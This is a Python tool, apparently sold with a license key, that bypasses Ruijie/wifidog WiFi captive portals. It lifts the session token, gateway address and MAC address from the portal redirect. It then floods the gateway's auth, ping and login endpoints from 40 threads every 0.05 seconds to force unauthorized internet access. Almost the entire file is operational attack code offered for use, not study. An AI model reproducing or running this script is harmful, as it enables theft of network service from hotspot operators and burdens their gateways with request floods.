import requests
import re
import urllib3
import time
import threading
import random
import sys
import os
import uuid
from urllib.parse import urlparse, parse_qs, quote
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# ANSI COLORS FOR TERMUX (Fixed formatting)
G = "\033[1;92m" 
C = "\033[1;96m" 
R = "\033[1;91m" 
Y = "\033[1;93m" 
W = "\033[0m"

BANNER = """[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      M O E   Y U   H A C K E R
[/]"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"HWID: [yellow]{my_hwid}[/]", title="[red]SECURITY[/]", border_style="cyan", expand=False)))
    try:
        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        res = requests.get(KEY_URL, timeout=10).text
        if user_key in res:
            console.print(f"{G}>>> ACCESS GRANTED!{W}")
            return True
        sys.exit(f"{R}INVALID KEY!{W}")
    except: sys.exit(f"{R}CONNECTION ERROR!{W}")

# ===============================
# ULTIMATE INJECTION ENGINE v17.0
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO (ULTIMATE PERSISTENCE) 🔥[/bold white]"), border_style="red", expand=False))
    
    # Persistent Session with high retry
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=5)
    session.mount('http://', adapter)
    
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    })

    while True:
        try:
            # Step 1: Internet Detection
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204 and "ruijie" not in check.url:
                sys.stdout.write(f"\r{G}[✓] STATUS: ONLINE | ENJOY YOUR INTERNET! ✅ {W}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # Step 2: Deep Extraction
            portal_url = check.url
            parsed = urlparse(portal_url)
            query = parse_qs(parsed.query)
            
            sid = (query.get('chap_challenge', [None])[0] or 
                   query.get('token', [None])[0] or 
                   query.get('sessionId', [None])[0])
            
            gw_ip = query.get('gw_address', [None])[0] or parsed.netloc.split(':')[0]
            gw_port = query.get('gw_port', ['2060'])[0]
            mac = query.get('mac', [''])[0]

            if sid:
                # Bypass URLs
                auth_url = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                ping_url = f"http://{gw_ip}:{gw_port}/wifidog/ping?token={sid}"
                login_force = f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}&mac={mac}"

                def heartbeat_pulse():
                    while True:
                        try:
                            # တစ်ပြိုင်နက်တည်းမှာ အကုန်ပစ်သွင်းခြင်း
                            session.get(auth_url, timeout=3)
                            session.get(ping_url, timeout=3)
                            session.get(login_force, timeout=3)
                            sys.stdout.write(f"\r{C}[!] Pulse Running: Sending Heartbeat to {gw_ip}... {W}")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.05) # Turbo Speed

                # Start 40 Threads for maximum impact
                for _ in range(40):
                    threading.Thread(target=heartbeat_pulse, daemon=True).start()

                console.print(f"\n{Y}[!] Token Injected. Now open Browser, click 'LOGIN' and then close VPN.{W}")
                
                # Stability Monitor
                while True:
                    try:
                        time.sleep(10)
                        if "ruijie" in requests.get("http://www.google.com", timeout=5).url:
                            break
                    except: break
            else:
                sys.stdout.write(f"\r{R}[×] Waiting for Token Capture... {W}")
                sys.stdout.flush()
                time.sleep(3)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        sys.exit()
